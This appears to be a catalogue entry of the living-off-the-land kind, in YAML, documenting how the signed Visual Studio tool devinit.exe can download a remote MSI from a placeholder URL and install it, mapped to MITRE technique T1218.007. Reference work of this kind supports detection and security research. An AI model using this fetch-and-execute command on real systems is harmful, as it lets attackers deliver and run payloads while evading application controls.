---
Name: Devinit.exe
Description: Visual Studio 2019 tool
Author: mr.d0x
Created: 2022-01-20
Commands:
  - Command: devinit.exe run -t msi-install -i https://example.com/out.msi
    Description: Downloads an MSI file to C:\Windows\Installer and then installs it.
    Usecase: Executes code from a (remote) MSI file.
    Category: Execute
    Privileges: User
    MitreID: T1218.007
    OperatingSystem: Windows 10, Windows 11
Full_Path:
  - Path: C:\Program Files\Microsoft Visual Studio\*\Community\Common7\Tools\devinit\devinit.exe
  - Path: C:\Program Files (x86)\Microsoft Visual Studio\*\Community\Common7\Tools\devinit\devinit.exe
Resources:
  - Link: https://twitter.com/mrd0x/status/1460815932402679809
Acknowledgement:
  - Person: mr.d0x
    Handle: '@mrd0x'
---
